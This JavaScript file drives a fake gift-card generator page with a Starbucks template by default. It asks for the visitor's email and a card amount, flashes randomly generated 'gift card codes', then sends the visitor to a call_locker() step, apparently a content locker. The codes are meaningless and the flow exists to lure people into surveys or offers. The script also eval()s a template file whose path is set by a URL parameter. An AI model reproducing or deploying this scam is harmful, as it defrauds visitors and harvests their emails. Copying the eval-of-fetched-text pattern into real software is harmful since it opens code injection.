var TEMPLATE = "STARBUCKS";

let searchParams = new URLSearchParams(window.location.search)

let PAR = searchParams.get("C")

if (PAR) { TEMPLATE = PAR; }






























$.get(TEMPLATE + "/" + TEMPLATE + ".txt", function(VVV) {
    eval(VVV);
    var AONCS = Math.round((STEP3_GIFTCARD_DURATION * 1000) / STEP3_GIFTCARD_INTERVAL);
    var AOC = 0;

    function GENCODE() {
        var AAA = STEP3_GIFTCARD_FORMAT.split("-");
        var CCC = [];
        AAA.forEach(function(xD) {
            if (xD.split("X").length - 1 > 0) {
                CCC.push(xD.split("X").length - 1)
            }
        })
        var CODE = "";
        CCC.forEach(function(Dx) {
            CODE = CODE + makeid(Dx) + "-"
        })
        CODE = CODE + AAA[AAA.length - 1]
        return CODE
    }
    $(function() {

      if (GOOGLE_FONT_LINK.length > 0) {
        $("head").prepend("<link href='" + GOOGLE_FONT_LINK + "' rel='stylesheet'>");
        $(".GIFTCARD").css("font-family", GOOGLE_FONT_FAMILY);
      }

      switch (GIFTCARD_TOP) {
          case "CLIP":
              $(".GIFTCARD").css("padding-top", "1rem");
              $(".GIFTCARD").append("<div class='FLICKKK2'></div>")
              break
      }

      switch (MAIN_BACKGROUND_TYPE) {

          case "COLOR":
              $("body").css("background-color", MAIN_BACKGROUND);
              $(".FLICKKK2").css("background-color", MAIN_BACKGROUND)
              break;
          case "GRADIENT":
              $("body").css("background", MAIN_BACKGROUND);
              $(".FLICKKK2").css("background", MAIN_BACKGROUND);
              break;
          case "IMAGE":
          MAIN_BACKGROUND = TEMPLATE + "/" + MAIN_BACKGROUND;
              $("body").css("background", "url(" + MAIN_BACKGROUND + ") center/cover no-repeat fixed")
              $(".FLICKKK2").css("background", "url(" + MAIN_BACKGROUND + ") center/cover no-repeat fixed")
              break
      }


        switch (GIFTCARD_COMPANY_TYPE) {
            case "IMAGE":
                $(".GIFTCARD").append('<img class="COMPANY img-fluid m-' + GIFTCARD_COMPANY_MARGIN + '" style="width: ' + GIFTCARD_COMPANY_WIDTH + '%;" src="' + TEMPLATE + "/" + GIFTCARD_COMPANY + '">');
                break;
            case "TEXT":
                $(".GIFTCARD").append("<" + GIFTCARD_COMPANY_HEADER + " class='m-" + GIFTCARD_COMPANY_MARGIN + "'>" + GIFTCARD_COMPANY + "</" + GIFTCARD_COMPANY_HEADER + ">");
                break
        }
        $(".GIFTCARD").css("color", GIFTCARD_TEXT_COLOR);

        if (GIFTCARD_TEXT_BORDER) {
          $(".GIFTCARD").css("text-shadow", "0 0 3px " + GIFTCARD_TEXT_BORDER)
        }

        if (GIFTCARD_IMAGE) {
            $(".GIFTCARD").append('<img class="GIFTCARD-IMAGE img-fluid m-' + GIFTCARD_IMAGE_MARGIN + '" src="' + TEMPLATE + "/" + GIFTCARD_IMAGE + '" style="width: ' + GIFTCARD_IMAGE_SIZE + '%;">')
        }
        switch (GIFTCARD_SIZE) {
            case "TALL":
                $(".GIFTCARD").css("height", "85vh");
                break;
            case "MEDIUM":
                $(".GIFTCARD").css("height", "75vh");
                break;
            case "SHORT":
                $(".GIFTCARD").css("height", "65vh");
                break
        }
        switch (GIFTCARD_BORDER) {
            case "SMALL":
                $(".GIFTCARD").css("border-radius", "1rem");
                break;
            case "MEDIUM":
                $(".GIFTCARD").css("border-radius", "1.75rem");
                break;
            case "BIG":
                $(".GIFTCARD").css("border-radius", "2.5rem");
                break
        }

        switch (GIFTCARD_BACKGROUND_TYPE) {
            case "COLOR":
                $(".GIFTCARD").css("background-color", GIFTCARD_BACKGROUND);
                break;
            case "GRADIENT":
                $(".GIFTCARD").css("background", GIFTCARD_BACKGROUND);
                break;
            case "IMAGE":
            GIFTCARD_BACKGROUND = TEMPLATE + "/" + GIFTCARD_BACKGROUND;
                $(".GIFTCARD").css("background", "url(" + GIFTCARD_BACKGROUND + ") center/cover no-repeat")
                break
        }
        $(".GIFTCARD").append('<' + STEP1_GIFTCARD_HEADER + ' class="STEP1 m-' + GIFTCARD_TITLE_MARGIN + '">' + STEP1_GIFTCARD_TITLE + '</' + STEP1_GIFTCARD_HEADER + '>');
        $(".GIFTCARD").append('<p class="STEP1 m-' + GIFTCARD_TEXT_MARGIN + ' ' + STEP1_TEXT_SIZE + '" style="width: ' + STEP1_TEXT_WIDTH + '%; text-align: ' + STEP1_TEXT_ALIGN + '">' + STEP1_TEXT + '</p>')
        $(".GIFTCARD").append('<input type="email" class="STEP1 ' + STEP1_INPUT_SIZE + ' m-' + STEP1_INPUT_MARGIN + ' form-control form-control-lg" style="width: ' + STEP1_INPUT_WIDTH + '%; border-color: ' + STEP1_INPUT_BORDER_COLOR + '" id="EMAIL" placeholder="' + STEP1_INPUT_PLACEHOLDER + '">')
        $(".GIFTCARD").append('<button id="BTN2" type="button" class="STEP1 btn btn-lg btn-primary ' + STEP1_BUTTON_SIZE + '" style="width: ' + STEP1_BUTTON_WIDTH + '%; color: ' + STEP1_BUTTON_COLOR + '; background-color: ' + STEP1_BUTTON_BG_COLOR + '; border-color: ' + STEP1_BUTTON_BORDER_COLOR + '">' + STEP1_BUTTON_TEXT + '</button>')
        GIFTCARD();
        $(".GIFTCARD").append('<button type="button" id="BTN1" class="S0 btn btn-lg btn-primary ' + STEP1_BUTTON_SIZE + '" style="width: ' + STEP1_BUTTON_WIDTH + '%; color: ' + STEP1_BUTTON_COLOR + '; background-color: ' + STEP1_BUTTON_BG_COLOR + '; border-color: ' + STEP1_BUTTON_BORDER_COLOR + '">' + STEP1_BUTTON_TEXT + '</button>')

        $("#BTN1").click(function() {
          S0();
        });

        $("#BTN2").click(function() {
          S2();
        });

    });
    var S0D = !1;

    function S0() {
        $(".S0").fadeOut(1000, function() {
            if (!S0D) {
                $(".STEP1").fadeIn(1000)
            }
        })
    }
    var S2D = !1;
    var S3D = !1;

    function S3() {
        $(".STEP2").fadeOut(1000, function() {
            if (!S3D) {
                $(".GIFTCARD").append('<' + STEP3_GIFTCARD_HEADER + ' class="STEP3 m-' + GIFTCARD_TITLE_MARGIN + '">' + STEP3_GIFTCARD_TITLE + '</' + STEP3_GIFTCARD_HEADER + '>');
                $(".GIFTCARD").append('<p class="STEP3 S3T m-' + GIFTCARD_TEXT_MARGIN + ' ' + STEP3_TEXT_SIZE + '" style="width: ' + STEP3_TEXT_WIDTH + '%; text-align: ' + STEP3_TEXT_ALIGN + '">' + STEP3_TEXT + '</p>')
                $(".GIFTCARD").append('<div class="CG m-' + STEP3_GIFTCARD_MARGIN + '"><' + STEP3_GIFTCARD_HEADER + ' id="CODE">' + STEP3_GIFTCARD_FORMAT + '</' + STEP3_GIFTCARD_HEADER + '></div>')
                $(".GIFTCARD").append('<button id="VBU" type="button" class="STEP3 btn btn-lg btn-primary ' + STEP3_BUTTON_SIZE + '" style="width: ' + STEP3_BUTTON_WIDTH + '%; color: ' + STEP3_BUTTON_COLOR + '; background-color: ' + STEP3_BUTTON_BG_COLOR + '; border-color: ' + STEP3_BUTTON_BORDER_COLOR + '">' + STEP3_BUTTON_TEXT + '</button>')
                var TEST = setInterval(function() {
                    if (AOC < AONCS) {
                        $("#CODE").text(GENCODE())
                        AOC++
                    } else {
                        $(".S3T").text(STEP3_VERIFY_TEXT);
                        $("#VBU").fadeIn(1000);
                        clearInterval(TEST)
                    }
                }, STEP3_GIFTCARD_INTERVAL)

                $("#VBU").click(function() {
                  call_locker();
                });

                S3D = !0
            }
        })
    }

    function S2() {
        if ($("#EMAIL").val() == "") {
            alert(STEP1_INPUT_ERROR_ALERT)
        } else {
            $(".STEP1").fadeOut(1000, function() {
                if (!S2D) {
                    $(".GIFTCARD").append('<' + STEP2_GIFTCARD_HEADER + ' class="STEP2 m-' + GIFTCARD_TITLE_MARGIN + '">' + STEP2_GIFTCARD_TITLE + '</' + STEP2_GIFTCARD_HEADER + '>');
                    $(".GIFTCARD").append('<p class="STEP2 m-' + GIFTCARD_TEXT_MARGIN + ' ' + STEP2_TEXT_SIZE + '" style="width: ' + STEP2_TEXT_WIDTH + '%; text-align: ' + STEP2_TEXT_ALIGN + '">' + STEP2_TEXT + '</p>')
                    $(".GIFTCARD").append('<div style="width: ' + STEP2_GIFTCARD_WIDTH + '%;" class="m-' + STEP2_GIFTCARD_MARGIN + ' input-group input-group-lg STEP2"> <div class="input-group-prepend"> <button style="background-color: ' + STEP1_BUTTON_BG_COLOR + '; border-color: ' + STEP1_BUTTON_BORDER_COLOR + '; color: ' + STEP1_BUTTON_COLOR + ';" class="btn btn-secondary" type="button" id="B1">-</button> </div> <input type="text" style="border-color: ' + STEP1_BUTTON_BORDER_COLOR + ';" class="form-control form-control-lg" readonly value="' + STEP2_GIFTCARD_DEFAULT + '" id="G-V"> <div class="input-group-append"> <button style="background-color: ' + STEP1_BUTTON_BG_COLOR + '; border-color: ' + STEP1_BUTTON_BORDER_COLOR + '; color: ' + STEP1_BUTTON_COLOR + ';" class="btn btn-secondary" type="button" id="B2">+</button> </div> </div>')
                    $(".GIFTCARD").append('<button id="BTN3" type="button" class="STEP2 btn btn-lg btn-primary ' + STEP2_BUTTON_SIZE + '" style="width: ' + STEP2_BUTTON_WIDTH + '%; color: ' + STEP2_BUTTON_COLOR + '; background-color: ' + STEP2_BUTTON_BG_COLOR + '; border-color: ' + STEP2_BUTTON_BORDER_COLOR + '">' + STEP2_BUTTON_TEXT + '</button>')

                    $("#BTN3").click(function() {
                      S3();
                    });

                    $("#B1").click(function() {
                      INCDEC(this);
                    });

                    $("#B2").click(function() {
                      INCDEC(this);
                    });

                    S2D = !0
                }
            })
        }
    }

    function GIFTCARD() {
        $(".GIFTCARD").append('<' + GIFTCARD_TITLE_HEADER + ' class="S0 m-' + GIFTCARD_TITLE_MARGIN + '">' + GIFTCARD_TITLE + '</' + GIFTCARD_TITLE_HEADER + '>');
        $(".GIFTCARD").append('<p class="S0 m-' + GIFTCARD_TEXT_MARGIN + ' ' + GIFTCARD_TEXT_SIZE + '" style="width: ' + GIFTCARD_TEXT_WIDTH + '%; text-align: ' + GIFTCARD_TEXT_ALIGN + '">' + GIFTCARD_TEXT + '</p>')
    }

    function INCDEC(Dx) {
        MODE = $(Dx).attr("id");
        LENG = STEP2_GIFTCARD_AMOUNTS.length;
        CURRENT = $("#G-V").val();
        CURRENTINDEX = STEP2_GIFTCARD_AMOUNTS.indexOf(CURRENT)
        if (MODE == "B2") {
            $("#G-V").val(STEP2_GIFTCARD_AMOUNTS[CURRENTINDEX + 1]);
            $("#B1").removeClass("disabled");
            $("#B1").attr("disabled", !1);
            if (CURRENTINDEX + 2 == LENG) {
                $("#B2").addClass("disabled");
                $("#B2").attr("disabled", !0)
            } else {
                $("#B2").removeClass("disabled");
                $("#B2").attr("disabled", !1)
            }
        } else if (MODE == "B1") {
            $("#G-V").val(STEP2_GIFTCARD_AMOUNTS[CURRENTINDEX - 1]);
            $("#B2").removeClass("disabled");
            $("#B2").attr("disabled", !1);
            if (CURRENTINDEX - 1 == 0) {
                $("#B1").addClass("disabled");
                $("#B1").attr("disabled", !0)
            } else {
                $("#B1").removeClass("disabled");
                $("#B1").attr("disabled", !1)
            }
        }
        CODECHOSEN = $("#G-V").val()
    }

    function makeid(xD) {
        var result = '';
        var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        var charactersLength = characters.length;
        for (var i = 0; i < xD; i++) {
            result += characters.charAt(Math.floor(Math.random() * charactersLength))
        }
        return result
    }

})
